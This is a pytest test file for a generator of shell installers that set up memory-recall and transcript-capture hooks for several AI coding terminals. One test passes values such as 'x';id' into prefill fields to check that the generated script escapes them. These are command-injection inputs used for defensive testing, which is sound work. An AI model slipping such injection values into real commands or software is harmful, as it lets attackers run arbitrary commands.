"""Unit tests for the interactive local-terminal installer generator."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tomllib
from pathlib import Path

import pytest

from octop.infra.agents.client_setup import (
    HOOKS_DIRS,
    TERMINALS,
    render_setup_script,
    render_uninstall_script,
)

_URL = "http://127.0.0.1:8088/mcp/memory/"

posix_only = pytest.mark.skipif(os.name != "posix", reason="假的 dsh 命令用 POSIX 可执行脚本")


def _script(**overrides) -> str:
    kwargs = {"mcp_url": _URL}
    kwargs.update(overrides)
    return render_setup_script(**kwargs)


def test_installer_detects_the_local_terminals() -> None:
    script = _script()

    assert '[ -e "$HOME/.claude.json" ] || [ -d "$HOME/.claude" ] || command -v claude' in script
    assert '[ -d "$HOME/.kiro" ] || command -v kiro' in script
    assert '[ -d "$HOME/.dsh" ] || command -v dsh' in script
    assert 'echo "  1) Claude Code' in script
    assert 'echo "  2) Kiro' in script
    assert 'echo "  3) DSH' in script


def test_installer_asks_instead_of_demanding_parameters() -> None:
    script = _script()

    # 交互走 /dev/tty：curl | sh 时 stdin 是脚本本身，直接 read 会把脚本吃掉
    assert "if (true </dev/tty) 2>/dev/null; then HAS_TTY=1; fi" in script
    assert script.count("< /dev/tty") >= 3  # 探测 + 选择 + token + 专家 ID
    assert "要配置哪些？" in script
    assert "专家 ID: " in script
    # 凭据提示按目标分流：本机实例与云端都问同一个实例共享 token
    assert "实例共享 token（本机实例，走 Authorization: Bearer）" in script
    assert "实例共享 token（云上实例）: " in script
    assert "stty -echo" in script  # 不回显
    # 没有 tty 时不盲读 stdin，而是明确要求环境变量
    assert 'TOKEN="${OCTOP_MEMORY_TOKEN:-}"' in script
    assert "非交互运行时请设 OCTOP_MEMORY_TOKEN" in script
    assert "非交互运行时请设 OCTOP_AGENT_ID" in script
    # 只有一份凭据：不再有 OAuth 前置 / 个人令牌这套东西
    assert "OCTOP_ENTRY_TOKEN" not in script
    assert "OCTOP_DISABLE_OAUTH" not in script
    assert "个人令牌" not in script
    # 会问用户标识（写进 X-Octop-User-Id）
    assert "用户标识（建议填域账号，如 alice" in script


def test_terminal_pick_allows_multiselect() -> None:
    """三个选项可多选：1,2 / 1 3 / 12 / a=全部，回车=全部检测到的。"""
    script = _script()

    assert "可多选：1,2 / 1 3 / 12 / a=全部" in script
    assert "''|a|A|all|ALL|全部) _chosen=\"$DETECTED\"" in script
    assert "fold -w1" in script  # 连写数字 12/13 按位拆开
    assert 'case ",$_chosen," in *",$_add,"*' in script  # 去重
    assert "已忽略" in script  # 未检测到/无法识别
    assert "没有选中任何已检测到的终端，请重选" in script  # 选不中会重问
    assert 'while [ -z "$TERMINALS" ]' in script


def test_installer_embeds_no_credential() -> None:
    """没内置默认值时不内嵌密钥：token 由运行的人输入（部署可选地内置一个，见 DEFAULT_TOKEN）。"""
    script = _script()

    assert "DEFAULT_TOKEN=" not in script
    assert "Bearer " in script  # 只在运行时按输入拼头，不是写死的 token
    # header 名可配、缺省 Authorization（不再按 token 前缀猜方言，也没有第二份凭据）
    assert 'TOKEN_HEADER="${OCTOP_TOKEN_HEADER:-Authorization}"' in script
    assert "OCTOP_ENTRY_TOKEN" not in script


def test_known_values_only_prefill_prompts() -> None:
    script = _script(agent_id="RY9RQC", terminals="kiro")

    assert "DEFAULT_AGENT='RY9RQC'" in script
    assert "DEFAULT_TERMINALS='kiro'" in script


def test_setup_script_shell_quotes_query_prefills() -> None:
    script = _script(agent_id="x';id", terminals="cursor';id")
    # Classic POSIX single-quote escape: ' → '"'"'
    assert "DEFAULT_AGENT='x'\"'\"';id'" in script
    assert "DEFAULT_TERMINALS='cursor'\"'\"';id'" in script
    assert "DEFAULT_AGENT='x';id'" not in script
    assert "DEFAULT_TERMINALS='cursor';id'" not in script


def test_each_terminal_gets_its_own_hooks_directory() -> None:
    script = _script()

    assert "CC_DIR='~/.claude/hooks-events'" in script
    assert "KIRO_DIR='~/.kiro/hooks'" in script
    assert "DSH_DIR='~/.dsh/hooks'" in script
    assert "CODEX_DIR='~/.codex/hooks'" in script
    assert "CURSOR_DIR='~/.cursor/hooks'" in script
    assert HOOKS_DIRS == {
        "claude-code": "~/.claude/hooks-events",
        "kiro": "~/.kiro/hooks",
        "dsh": "~/.dsh/hooks",
        "codex": "~/.codex/hooks",
        "cursor": "~/.cursor/hooks",
    }


def test_claude_code_uses_two_command_hooks() -> None:
    """Claude Code：召回与上报都必须是 command hook。

    - ``UserPromptSubmit`` 上 `mcp_tool` 会被静默跳过（实测 2.1.263）；
    - ``Stop`` 用脚本，脚本自己后台脱离+延迟，等本轮落盘后再读 transcript
      （``SessionEnd`` 不可用：那里没有 MCP 客户端上下文）。
    """
    script = _script()

    assert (
        'search = {"type": "command", "command": hook_command(f"{hooks_dir}/claude-code/user-prompt-recall.mjs")}'
        in script
    )
    assert (
        'stop = {"type": "command", "command": hook_command(f"{hooks_dir}/claude-code/stop-capture.mjs")}'
        in script
    )
    assert "该事件不支持 ``mcp_tool``" in script
    assert "SessionEnd`` 不能用" in script
    # 简写形态：事件直接挂 handler 数组，不套 matcher 组那层
    # （某些终端的 SDK 侧不保证 hooks 数组按顺序执行，少一层嵌套更稳）
    assert 'return {"UserPromptSubmit": [search], "Stop": [stop]}' in script
    # 收尾提示按事件名列出两端角色（Cursor 的事件名不同，故不能只写 UserPromptSubmit/Stop）
    assert "用户提交时召回" in script and "memory_search" in script
    assert "回合结束时上报" in script and "memory_capture" in script
    assert "Cursor 的 beforeSubmitPrompt" in script


def test_claude_code_clears_the_legacy_session_end_hook() -> None:
    """早期版本挂过 SessionEnd（mcp_tool 在那里不可用、会持续报错）：重装时要清掉。"""
    script = _script()

    assert '_upsert_groups(st, "SessionEnd", [])' in script
    assert 'st["hooks"].pop("SessionEnd", None)' in script
    assert 'hooks["SessionEnd"]' not in script  # 不再定义


def test_previous_inline_hook_command_is_replaced_by_the_wrapper(tmp_path) -> None:
    """老配置里那串内联 node 命令（含 ``.mjs`` 与转义字符）重装时换成包装脚本，不留重复。

    这也是升级路径：``_is_our_handler`` 同时认 ``.mjs`` / ``.sh`` 两种形态，所以老条目会被
    替换掉而不是并列留下。
    """
    legacy = (
        "/usr/bin/node /home/u/.claude/hooks-events/claude-code/stop-capture.mjs "
        '|| echo "octop-memory: hook 执行失败（node 路径不对或脚本报错）" >&2'
    )
    home, _ = _run_claude_code_installer(
        tmp_path, {}, {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": legacy}]}]}}
    )
    stops = json.loads((home / ".claude/settings.json").read_text(encoding="utf-8"))["hooks"][
        "Stop"
    ]
    assert len(stops) == 1  # 老命令被替换，没有并列
    assert stops[0]["type"] == "command"  # 换成简写形态（事件直接挂 handler）
    command = stops[0]["command"]
    assert command.endswith("claude-code/stop-capture.sh")
    assert ".mjs" not in command  # 配置里不再有那串长命令
    assert (home / ".claude/hooks-events/claude-code/stop-capture.sh").exists()


def test_foreign_hook_groups_are_kept_next_to_ours(tmp_path) -> None:
    """别人的 hook（matcher 组或裸 handler）都要原样留着，只动我们自己那两条。"""
    settings = {
        "hooks": {
            "Stop": [
                {"matcher": "*", "hooks": [{"type": "command", "command": "git-ai checkpoint"}]},
                {"type": "command", "command": "/usr/local/bin/other-check"},
            ]
        }
    }
    home, _ = _run_claude_code_installer(tmp_path, {}, settings)
    stops = json.loads((home / ".claude/settings.json").read_text(encoding="utf-8"))["hooks"][
        "Stop"
    ]

    assert stops[0] == {
        "matcher": "*",
        "hooks": [{"type": "command", "command": "git-ai checkpoint"}],
    }
    assert stops[1] == {"type": "command", "command": "/usr/local/bin/other-check"}
    assert stops[2]["command"].endswith("claude-code/stop-capture.sh")  # 我们的追加在最后


def test_scripts_are_installed_for_every_host_and_mode() -> None:
    """脚本直传不再挑 token 方言：谁能问的由 X-Octop-User-Id 表达，所以任何模式都装。

    （早期版本用 ``SCRIPT_OK = LOCAL`` 之类的判据把共享 token 挡在脚本之外，结果 Kiro 上报
    退化成模型自己总结、DSH 干脆不装 hooks。）
    """
    script = _script()

    assert "SCRIPT_OK" not in script
    assert "CAPTURE_PROMPT" not in script  # 上报绝不走"让模型总结"的提示词
    # Claude Code 任何模式都要装脚本（召回 hook 是 command 脚本）
    assert "def do_claude_code():\n    # 两条 hook 都是 command 脚本" in script
    assert '_install_hooks(CC_DIR, "claude-code")' in script
    assert '_install_hooks(KIRO_DIR, "kiro")' in script
    assert '_install_hooks(DSH_DIR, "dsh")' in script
    assert '_install_hooks(CODEX_DIR, "codex")' in script
    assert '_install_hooks(CURSOR_DIR, "cursor")' in script


def test_kiro_capture_is_always_a_command_hook() -> None:
    """Kiro：召回用提示词（Kiro 只支持 runCommand/askAgent）；上报始终用脚本提交整段 jsonl。"""
    script = _script()

    kiro = script[script.index("def do_kiro():") : script.index("def _dsh_bridge(")]
    # 召回仍然是 agent 提示词（runCommand 的 stdout 不会被注入上下文）
    assert '"action": {"type": "agent", "prompt": SEARCH_PROMPT}' in kiro
    # 上报只有 command 一种形态，没有提示词兜底
    assert (
        '{"type": "command", "command": hook_command(f"{KIRO_DIR}/kiro/stop-capture.mjs")}' in kiro
    )
    assert '"type": "agent", "prompt": CAPTURE_PROMPT' not in kiro
    assert "提交整段 messages.jsonl" in kiro
    assert "Kiro 上报 hook" in script


def test_prompts_carry_the_role_instructions() -> None:
    script = _script()

    assert "先用 memory_search 检索" in script
    # 上报没有提示词：模型"总结会话"不算捕获原始会话
    assert "用 memory_capture 记录" not in script


def test_generated_script_embeds_each_hosts_scripts() -> None:
    """按宿主分别内嵌：共享传输模块 + 该宿主的入口脚本（含 detach/延迟逻辑）。"""
    script = _script()

    assert "OCTOP_FILES_CLAUDE_CODE=" in script
    assert "OCTOP_FILES_KIRO=" in script and "OCTOP_FILES_DSH=" in script
    assert "OCTOP_FILES_CODEX=" in script and "OCTOP_FILES_CURSOR=" in script
    assert "OCTOP_FILES_PRESET=" in script
    assert "HOOK_FILES = {" in script and "OCTOP_FILES_" in script
    assert "lib/octop-memory-client.mjs" in script
    assert "claude-code/stop-capture.mjs" in script and "kiro/stop-capture.mjs" in script
    assert "dsh/stop-capture.mjs" in script and "dsh/user-prompt-recall.mjs" in script
    assert "dsh/memory-target.mjs" in script
    assert "codex/user-prompt-recall.mjs" in script and "codex/stop-capture.mjs" in script
    assert "cursor/user-prompt-recall.mjs" in script and "cursor/stop-capture.mjs" in script
    # 旧版的单文件变量不再使用
    assert "OCTOP_STOP_B64" not in script and "OCTOP_RECALL_B64" not in script


def test_dsh_bridge_points_at_the_dsh_entry_scripts() -> None:
    """DSH 的桥接只跑 command 钩子（mcp_tool / prompt 会被跳过），且必须指向 DSH 自己的脚本。

    DSH 只装 ``dsh/`` 目录下的入口脚本；指向 ``claude-code/`` 等于两条钩子都指向不存在的文件。
    """
    script = _script()

    assert "def _dsh_bridge(hooks_dir):" in script
    assert 'DSH_DIR / "octop-hooks.json"' in script
    assert "{hooks_dir}/dsh/user-prompt-recall.mjs" in script
    assert "{hooks_dir}/dsh/stop-capture.mjs" in script
    bridge = script[script.index("def _dsh_bridge(") : script.index("def do_dsh():")]
    assert "{hooks_dir}/claude-code/" not in bridge


def test_dsh_installs_the_preset_bundle() -> None:
    """DSH ≥0.1.7 的 preset 由 bundle patch 声明：安装器生成 bundle 并装进 profile。"""
    script = _script()

    assert "OCTOP_FILES_PRESET=" in script
    assert "def _install_dsh_preset(bridge):" in script
    assert "def _select_dsh_bundle(profile_dir, name):" in script
    assert '"__OCTOP_HOOKS_JSON__"' in script  # 模板占位符换成实际桥接文件
    assert '"dsh", "plugin", "--profile", profile, "add", str(bundle)' in script
    assert '"pnpm", "add", str(bundle)' in script  # 源码 checkout 常没有 dsh 命令
    assert "def _run_dsh_install(bundle, profile, profile_dir):" in script
    assert (
        'config.setdefault("dsh", {}).setdefault("profile", {}).setdefault("bundles", [])' in script
    )
    assert "重启 DSH" in script
    assert "没找到 DSH profile" in script


def test_loopback_targets_use_the_configured_header() -> None:
    """本机实例的共享 token 缺省走 ``Authorization: Bearer``；header 名可配、不猜前缀。"""
    script = _script()

    # 判据用 hooks 真正要打的地址
    assert 'URL_HOST="$(printf \'%s\' "$HOOK_URL"' in script
    assert "127.0.0.1|localhost) IS_LOCAL=1" in script
    assert "实例共享 token（本机实例，走 Authorization: Bearer）" in script
    assert "实例共享 token（云上实例）: " in script
    # 不再有 token 前缀方言判定或硬编码 header 名
    assert 'TOKEN_HEADER="${OCTOP_TOKEN_HEADER:-Authorization}"' in script
    assert "客户端 MCP 条目与 hooks：" in script


def test_node_is_resolved_to_an_absolute_path() -> None:
    """hook 由终端派生、常在非 login shell 里跑：node 必须解析成绝对路径。

    裸 node（nvm 场景）在那种 shell 里找不到，而 command hook 的非 0 退出是静默的。
    """
    script = _script()

    assert 'NODE_BIN="${OCTOP_NODE:-}"' in script
    assert "command -v node" in script
    assert "$HOME/.nvm/versions/node" in script  # nvm 是最常见的坑
    assert "/opt/homebrew/bin/node" in script and "/usr/local/bin/node" in script
    assert "找不到 node 的绝对路径" in script  # 都找不到时明确告警
    assert 'export OCTOP_NODE="$NODE_BIN"' in script


def test_hook_commands_use_the_resolved_node_and_report_failures() -> None:
    script = _script()

    assert 'NODE = os.environ.get("OCTOP_NODE") or "node"' in script
    assert "def hook_command(script_path):" in script
    assert 'hook_command(f"{hooks_dir}/claude-code/stop-capture.mjs")' in script
    assert 'hook_command(f"{KIRO_DIR}/kiro/stop-capture.mjs")' in script
    assert '|| echo "octop-memory: hook 执行失败' in script  # 非 0 退出不再静默
    # 企业根在系统证书库里、不在 Node 自带库里：Node 22.15+ 才加 --use-system-ca
    assert "OCTOP_USE_SYSTEM_CA" in script
    assert "--use-system-ca" in script
    assert 'NODE_OPTIONS="${NODE_OPTIONS:+$NODE_OPTIONS }--use-system-ca"' in script


def test_installer_names_the_log_and_state_location() -> None:
    """日志与增量状态就落在终端自己的 hooks 目录（该目录不可写才退到临时目录）。"""
    script = _script()

    assert "日志/增量状态：" in script
    assert "{target}/octop-hook.log" in script
    assert "{target}/octop-transcript-state.json" in script
    assert "$TMPDIR/octop-hooks" in script


def test_mcp_entry_is_per_terminal_and_keeps_other_entries() -> None:
    script = _script()

    assert 'home / ".claude.json"' in script
    assert 'home / ".kiro" / "settings" / "mcp.json"' in script
    assert "def _octop_servers(servers):" in script  # 按 octop-memory* 认已有服务，不认具体名字
    assert "保持原样" in script
    assert "if not any(" in script


def test_legacy_mcp_tool_hooks_are_recognized_by_tool_not_by_server_name() -> None:
    """旧版 mcp_tool hook 的清理按工具名认：服务名可能是 local / prod / oauth 或改过名。"""
    script = _script()

    assert '_OUR_MCP_TOOLS = ("memory_search", "memory_capture")' in script
    assert 'handler.get("tool") in _OUR_MCP_TOOLS' in script
    assert 'handler.get("server") == NAME' not in script


def test_endpoint_self_check_is_warn_only() -> None:
    script = _script()

    assert "端点自检" in script
    assert "安装仍继续" in script
    # 自检与 hook 共用同一次探测；支持时先 export NODE_OPTIONS，再去 fetch
    assert 'if "$NODE_BIN" --use-system-ca -e' in script
    assert "export NODE_OPTIONS" in script
    assert "AbortSignal.timeout(8000)" in script


def test_server_name_follows_the_endpoint() -> None:
    assert "OCTOP_SERVER_NAME='octop-memory-local'" in _script()
    remote = _script(mcp_url="https://octop.example.com/mcp/")
    assert "OCTOP_SERVER_NAME='octop-memory'" in remote
    assert "octop-memory-local" not in remote


def test_generator_knows_only_the_supported_terminals() -> None:
    assert TERMINALS == ("claude-code", "kiro", "dsh", "codex", "cursor")


def test_codex_and_cursor_are_detected_and_offered() -> None:
    """两个宿主都要进检测与菜单（此前只有脚本、没有安装入口）。"""
    script = _script()

    assert '[ -d "$HOME/.codex" ] || command -v codex' in script
    assert '[ -d "$HOME/.cursor" ] || command -v cursor' in script
    assert 'echo "  4) Codex' in script and 'echo "  5) Cursor' in script
    assert '"codex|Codex' in script and '"cursor|Cursor' in script
    assert "请重选（1-5，或 a=全部）" in script
    assert "4) _add=" in script and "5) _add=" in script
    assert '"codex": do_codex' in script and '"cursor": do_cursor' in script


def test_terminal_selection_is_an_interactive_checklist() -> None:
    """选终端是清单式：↑↓ 移动 · 空格 选择 · a 全选 · 回车 确认（参考常见安装器交互）。"""
    script = _script()

    assert "OCTOP_SELECT" in script
    assert "↑/↓ 移动 · 空格 选择 · a 全选 · 回车 确认" in script
    assert 'if key == b"\\x1b":' in script  # 方向键 ESC [ A/B
    assert 'return {b"[A": "up", b"[B": "down"}' in script
    assert 'if key == b" ":' in script  # 空格切换
    assert "setraw(fd)" in script  # raw 模式读单键
    assert 'box = "◉" if chosen[index] else "◯"' in script  # 勾选状态可见
    # 一个都没选时回车不确认；无 tty / python3 不可用则回退数字输入
    assert "if not any(chosen):" in script
    assert "可多选：1,2 / 1 3 / 12 / a=全部" in script


def test_checklist_helper_is_valid_python() -> None:
    import ast

    from octop.infra.agents.client_setup import _SELECT_PY

    ast.parse(_SELECT_PY)  # 片段直接内嵌进生成的脚本，必须能独立解析
    assert "sys.exit(main())" in _SELECT_PY


def test_generated_installer_actually_runs(tmp_path) -> None:
    """把生成的安装脚本真跑一遍（沙箱 HOME）。

    脚本是 shell + 内嵌 python 拼出来的：语法正确不等于能跑，拼装错误（变量改名、
    参数漏传）只有执行才会暴露。
    """
    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    home = tmp_path / "home"
    for name in (".claude", ".kiro", ".dsh", ".codex", ".cursor"):
        (home / name).mkdir(parents=True, exist_ok=True)

    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code,kiro,dsh,codex,cursor",
            "OCTOP_MEMORY_TOKEN": "fake-token",
            "OCTOP_AGENT_ID": "AGT1",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    # 每个宿主只有自己的入口脚本 + 一份共享传输模块 + config.json
    assert (home / ".claude/hooks-events/claude-code/stop-capture.mjs").exists()
    assert (home / ".claude/hooks-events/claude-code/user-prompt-recall.mjs").exists()
    assert (home / ".kiro/hooks/kiro/stop-capture.mjs").exists()
    assert (home / ".dsh/hooks/dsh/stop-capture.mjs").exists()
    assert (home / ".dsh/hooks/dsh/user-prompt-recall.mjs").exists()
    assert (home / ".dsh/hooks/dsh/memory-target.mjs").exists()
    assert (home / ".codex/hooks/codex/stop-capture.mjs").exists()
    assert (home / ".codex/hooks/codex/user-prompt-recall.mjs").exists()
    assert (home / ".cursor/hooks/cursor/stop-capture.mjs").exists()
    assert (home / ".cursor/hooks/cursor/user-prompt-recall.mjs").exists()
    for hooks_dir in (
        ".claude/hooks-events",
        ".kiro/hooks",
        ".dsh/hooks",
        ".codex/hooks",
        ".cursor/hooks",
    ):
        assert (home / hooks_dir / "lib/octop-memory-client.mjs").exists()
        assert (home / hooks_dir / "config.json").exists()
    # 宿主之间不串：CC 目录里不该出现 kiro/dsh 的入口
    assert not (home / ".claude/hooks-events/kiro").exists()
    assert not (home / ".kiro/hooks/claude-code").exists()
    # Codex / Cursor 的 hook 配置只引用包装脚本路径（长命令收在 .sh 里，配置里没有引号/转义坑）
    assert ".codex/hooks/codex/stop-capture.sh" in (home / ".codex/config.toml").read_text(
        encoding="utf-8"
    )
    cursor_hooks = json.loads((home / ".cursor/hooks.json").read_text(encoding="utf-8"))
    assert (
        "cursor/hooks/cursor/user-prompt-recall.sh"
        in cursor_hooks["hooks"]["beforeSubmitPrompt"][0]["command"]
    )
    assert "cursor/hooks/cursor/stop-capture.sh" in cursor_hooks["hooks"]["stop"][0]["command"]
    # 每个宿主的包装脚本：可执行，内容是「绝对 node 路径 + .mjs + 失败兜底」
    for hooks_dir, host in (
        (".claude/hooks-events", "claude-code"),
        (".kiro/hooks", "kiro"),
        (".dsh/hooks", "dsh"),
        (".codex/hooks", "codex"),
        (".cursor/hooks", "cursor"),
    ):
        wrapper = home / hooks_dir / host / "stop-capture.sh"
        text = wrapper.read_text(encoding="utf-8")
        assert text.startswith("#!/bin/sh")
        assert f"{host}/stop-capture.mjs" in text
        assert "hook 执行失败" in text  # 非 0 退出不再静默
        assert os.access(wrapper, os.X_OK)
        if "node 使用系统证书库" in result.stdout:
            assert "--use-system-ca" in text
    # DSH 桥接指向 DSH 自己的包装脚本，且 preset bundle 已生成并把占位符换成了桥接文件
    bridge = home / ".dsh/hooks/octop-hooks.json"
    bridge_text = bridge.read_text(encoding="utf-8")
    assert "dsh/user-prompt-recall.sh" in bridge_text
    assert "dsh/stop-capture.sh" in bridge_text
    assert "claude-code/" not in bridge_text
    bundle = home / ".dsh/bundles/dsh-memory-share"
    assert (bundle / "package.json").exists()
    patch = (bundle / "cordis.patch.yml").read_text(encoding="utf-8")
    assert "__OCTOP_HOOKS_JSON__" not in patch
    assert str(bridge) in patch
    assert "octop-shared-memory" in patch


_CODEX_EXISTING = """model = "gpt-5"

[[hooks.PreToolUse]]

[[hooks.PreToolUse.hooks]]
command = "/usr/local/bin/git-ai checkpoint codex"
type = "command"

[[hooks.Stop]]

[[hooks.Stop.hooks]]
command = "/usr/local/bin/git-ai checkpoint codex"
type = "command"

[hooks.state."CONFIG:stop:0:0"]
enabled = true
trusted_hash = "sha256:deadbeef"
"""


def _run_terminals(tmp_path, terminals: str, prepare=None, extra_env=None):
    """按给定终端跑两遍安装器（第二遍验证幂等）。"""
    home = tmp_path / "home"
    home.mkdir(parents=True, exist_ok=True)
    if prepare is not None:
        prepare(home)
    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    env = {
        **os.environ,
        "HOME": str(home),
        "OCTOP_TERMINALS": terminals,
        "OCTOP_MEMORY_TOKEN": "fake-token",
        "OCTOP_AGENT_ID": "AGT1",
        **(extra_env or {}),
    }
    for _ in range(2):
        result = subprocess.run(
            ["sh", str(script)], env=env, capture_output=True, text=True, timeout=180
        )
        assert result.returncode == 0, result.stdout + result.stderr
    return home


def test_user_id_is_written_and_sent_only_when_given(tmp_path) -> None:
    """「谁问的」只能靠 X-Octop-User-Id 表达：给了就写，没给就不写。"""
    home = _run_terminals(
        tmp_path / "with-id",
        "claude-code",
        extra_env={"OCTOP_USER_ID": "alice"},
    )
    config = json.loads((home / ".claude/hooks-events/config.json").read_text(encoding="utf-8"))
    assert config["userId"] == "alice"

    entry = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"][
        "octop-memory-local"
    ]
    assert entry["headers"]["X-Octop-User-Id"] == "alice"

    # 不传就保持匿名：配置里不写 userId，MCP 条目也不加头
    home2 = _run_terminals(
        tmp_path / "anonymous",
        "claude-code",
        extra_env={"OCTOP_USER_ID": ""},
    )
    config2 = json.loads((home2 / ".claude/hooks-events/config.json").read_text(encoding="utf-8"))
    assert "userId" not in config2
    entry2 = json.loads((home2 / ".claude.json").read_text(encoding="utf-8"))["mcpServers"][
        "octop-memory-local"
    ]
    assert "X-Octop-User-Id" not in entry2["headers"]


def test_entry_uses_authorization_bearer(tmp_path) -> None:
    """条目缺省是 ``X-Octop-Agent-Id`` + ``Authorization: Bearer <token>``。"""
    home = _run_terminals(tmp_path, "claude-code")
    entry = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"][
        "octop-memory-local"
    ]
    assert entry["headers"]["Authorization"] == "Bearer fake-token"
    assert "X-Octop-Memory-Token" not in entry["headers"]

    # header 名可配：非 Authorization 时原样写该 header（不加 Bearer 前缀）
    home_custom = tmp_path / "custom-home"
    (home_custom / ".claude").mkdir(parents=True)
    custom_script = tmp_path / "setup-custom.sh"
    custom_script.write_text(
        _script(mcp_url="https://octop.example.com/mcp/memory/"), encoding="utf-8"
    )
    result = subprocess.run(
        ["sh", str(custom_script)],
        env={
            **os.environ,
            "HOME": str(home_custom),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_MEMORY_TOKEN": "shared-token",
            "OCTOP_TOKEN_HEADER": "X-Octop-Memory-Token",
            "OCTOP_AGENT_ID": "AGT1",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    custom_entry = json.loads((home_custom / ".claude.json").read_text(encoding="utf-8"))[
        "mcpServers"
    ]["octop-memory"]
    assert custom_entry["headers"]["X-Octop-Memory-Token"] == "shared-token"
    assert "Authorization" not in custom_entry["headers"]


def test_non_ascii_user_id_is_ignored(tmp_path) -> None:
    """HTTP header 只能 ASCII（Node fetch 对中文直接抛错）→ 明确忽略并提示，别装完才崩。"""
    script = tmp_path / "setup.sh"
    script.write_text(_script(), encoding="utf-8")
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_MEMORY_TOKEN": "fake-token",
            "OCTOP_AGENT_ID": "AGT1",
            "OCTOP_USER_ID": "用户甲",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert "含非 ASCII" in result.stdout
    config = json.loads((home / ".claude/hooks-events/config.json").read_text(encoding="utf-8"))
    assert "userId" not in config
    entry = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"][
        "octop-memory-local"
    ]
    assert "X-Octop-User-Id" not in entry["headers"]


def test_declared_public_url_becomes_the_entry_address(tmp_path) -> None:
    """条目地址与 hooks 地址可以分开：条目走部署声明的公网地址，hooks 打实例挂载点。

    两份地址共用同一个**实例共享 token**（不再有个人令牌 / OAuth 模式）。
    """
    public = "https://octop-memory.example.com/mcp/memory/"
    direct = "https://octop.example.com/mcp/memory/"
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    script = tmp_path / "setup.sh"
    script.write_text(_script(mcp_url=public, hook_url=direct), encoding="utf-8")
    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_MEMORY_TOKEN": "shared-token",
            "OCTOP_AGENT_ID": "AGT1",
            "OCTOP_USER_ID": "alice",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    servers = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"]
    name, entry = next(iter(servers.items()))
    assert name == "octop-memory"
    assert entry["url"] == public
    assert entry["headers"] == {
        "X-Octop-Agent-Id": "AGT1",
        "Authorization": "Bearer shared-token",
        "X-Octop-User-Id": "alice",
    }
    config = json.loads((home / ".claude/hooks-events/config.json").read_text(encoding="utf-8"))
    assert config["url"] == direct and config["token"] == "shared-token"


def test_entry_defaults_to_the_instance_mount(tmp_path) -> None:
    """没有声明公网地址时，条目与 hooks 都落在实例自己的挂载点。"""
    instance = "https://octop.example.com/mcp/memory/"
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    script = tmp_path / "setup.sh"
    script.write_text(_script(mcp_url=instance), encoding="utf-8")
    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_MEMORY_TOKEN": "shared-token",
            "OCTOP_AGENT_ID": "AGT1",
            "OCTOP_USER_ID": "alice",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    servers = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"]
    entry = next(iter(servers.values()))
    assert entry["url"] == instance
    assert entry["headers"] == {
        "X-Octop-Agent-Id": "AGT1",
        "Authorization": "Bearer shared-token",
        "X-Octop-User-Id": "alice",
    }


def test_split_urls_keep_one_shared_token(tmp_path) -> None:
    """条目与 hooks 地址不同也只有一个凭据：实例共享 token（不再有个人令牌）。

    hooks 打实例（共享 token + ``X-Octop-User-Id``）；条目走部署声明的公网地址，
    用的是同一份共享 token——由 ingress 原样转发。
    """
    public = "https://octop-memory.example.com/mcp/memory/"
    direct = "https://octop.example.com/mcp/memory/"
    script = tmp_path / "setup.sh"
    script.write_text(_script(mcp_url=public, hook_url=direct), encoding="utf-8")
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_MEMORY_TOKEN": "shared-token",
            "OCTOP_AGENT_ID": "AGT1",
            "OCTOP_USER_ID": "alice",
        },
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    config = json.loads((home / ".claude/hooks-events/config.json").read_text(encoding="utf-8"))
    assert config["url"] == direct  # hooks 直连实例
    assert config["token"] == "shared-token" and config["userId"] == "alice"

    entry = json.loads((home / ".claude.json").read_text(encoding="utf-8"))["mcpServers"][
        "octop-memory"
    ]
    assert entry["url"] == public
    assert entry["headers"] == {
        "X-Octop-Agent-Id": "AGT1",
        "Authorization": "Bearer shared-token",
        "X-Octop-User-Id": "alice",
    }
    assert "实例共享 token" in result.stdout


def test_builtin_default_token_saves_the_prompt(tmp_path) -> None:
    """部署内置的默认凭据（实例发布时的 OCTOP_MEMORY_MCP_TOKEN）→ 用户只给专家 ID 就能装。"""
    script = tmp_path / "setup.sh"
    script.write_text(_script(default_token="octopoctop"), encoding="utf-8")
    home = tmp_path / "home"
    (home / ".claude").mkdir(parents=True)
    result = subprocess.run(
        ["sh", str(script)],
        env={
            **os.environ,
            "HOME": str(home),
            "OCTOP_TERMINALS": "claude-code",
            "OCTOP_AGENT_ID": "AGT1",  # 没有 OCTOP_MEMORY_TOKEN / OCTOP_USER_ID
        },
        capture_output=True,
        text=True,
        timeout=180,
    )

    assert result.returncode == 0, result.stdout + result.stderr
